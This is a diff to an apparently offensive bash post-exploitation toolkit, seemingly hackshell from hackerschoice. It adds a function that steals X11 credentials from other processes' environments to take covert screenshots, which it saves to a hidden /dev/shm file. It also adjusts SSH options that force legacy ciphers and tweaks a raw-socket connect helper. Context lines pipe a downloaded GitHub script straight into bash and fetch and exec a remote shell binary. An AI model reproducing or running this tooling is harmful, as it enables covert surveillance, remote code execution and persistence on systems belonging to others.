@@ -273,6 +273,7 @@ xnc() {
     perl -e '
         use IO::Socket::INET;
         my $s=IO::Socket::INET->new(PeerAddr=>$ARGV[0],PeerPort=>$ARGV[1],Proto=>"tcp",Timeout=>10)or die "$!\n";
+        print STDERR "Connected to $ARGV[0]:$ARGV[1]\n";
         $s->autoflush(1);$|=1;
         my $buf;
         while(1){
@@ -2565,6 +2566,22 @@ ws() {
     dl 'https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/whatserver.sh' | bash
 }
 
+# Take a screenshot of the current X11 session (if any)
+sc() {
+  local f DISPLAY XAUTHORITY fn=${FN:-/dev/shm/.data}
+  for f in /proc/[0-9]*/environ; do
+    eval "$(tr '\0' '\n' < "$f" 2>/dev/null | grep -E '^DISPLAY=|^XAUTHORITY=')"
+    [ -n "$DISPLAY" ] || continue
+    DISPLAY="$DISPLAY" XAUTHORITY="$XAUTHORITY" timeout 2 xwd -silent -root 2>/dev/null | gzip >"$fn"
+    [ "${PIPESTATUS[0]}" -eq 0 ] && { 
+        ls -al "$fn" 2>/dev/null
+        echo "gunzip <${fn##*/} | xwdtopnm | pnmtopng >$(date +%Y%m%d_%H%M%S)_${HN:-$(hostname)}_sc.png"
+        return 0
+    }
+  done
+  return 1
+}
+
 xresize() {
     local R a IFS
     # NOTE: On localhost, this wont always work because xterm responds to fast and
@@ -2870,12 +2887,24 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
         # Even if 'ssh -Q' shows the key it sometimes complains that it cant use them.
         # User can set SSH_NO_OLD before hs to disable old ciphers.
         [ -z "$SSH_NO_OLD" ] && command ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -V 2>/dev/null && HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
-        [ -z "$SSH_NO_OLD" ] && command ssh -oHostKeyAlgorithms=+ssh-dss -V 2>/dev/null && HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
-        [ -z "$SSH_NO_OLD" ] && command ssh -oCiphers=+aes128-cbc -V 2>/dev/null && HS_SSH_OPT+=("-oCiphers=+aes128-cbc")
-        [ -z "$SSH_NO_OLD" ] && command ssh -oCiphers=+3des-cbc -V 2>/dev/null && HS_SSH_OPT+=("-oCiphers=+3des-cbc")
+
+        hka=""
+        [ -z "$SSH_NO_OLD" ] && command ssh -oHostKeyAlgorithms=+ssh-dss -V 2>/dev/null && hka+="ssh-dss,"
+        [ -z "$SSH_NO_OLD" ] && command ssh -oHostKeyAlgorithms=+ssh-rsa -V 2>/dev/null && hka+="ssh-rsa,"
+        [ -n "$hka" ] && HS_SSH_OPT+=("-oHostKeyAlgorithms=+${hka%,}")
+
+        pka=""
+        [ -z "$SSH_NO_OLD" ] && command ssh -oPubkeyAcceptedAlgorithms=+ssh-rsa -V 2>/dev/null && pka+="ssh-rsa,"
+        [ -n "$pka" ] && HS_SSH_OPT+=("-oPubkeyAcceptedAlgorithms=+${pka%,}")
+
+        ciphers=""
+        [ -z "$SSH_NO_OLD" ] && command ssh -oCiphers=+aes128-cbc -V 2>/dev/null && ciphers+="aes128-cbc,"
+        [ -z "$SSH_NO_OLD" ] && command ssh -oCiphers=+3des-cbc -V 2>/dev/null && ciphers+="3des-cbc,"
+        [ -n "$ciphers" ] && HS_SSH_OPT+=("-oCiphers=+${ciphers%,}")
 
         HS_SSH_OPT+=("-oConnectTimeout=5")
         HS_SSH_OPT+=("-oServerAliveInterval=30")
+        unset str a hka pka ciphers
     }
 
     _hs_enc_init
@@ -3116,7 +3145,7 @@ hs_init_shell() {
     [ -z "$_HS_HUSH" ] && [ -d "${XHOME}" ] && _HS_HUSH=1
 
     [ -z "$_HS_PATH_ORIG" ] && _HS_PATH_ORIG="$PATH"
-    [ "${PATH:0:2}" != ".:" ] && export PATH=".:${PATH}"
+    #[ "${PATH:0:2}" != ".:" ] && export PATH=".:${PATH}"
     # Might already exist.
     [ -d "$XHOME" ] && {
         _hs_xhome_init
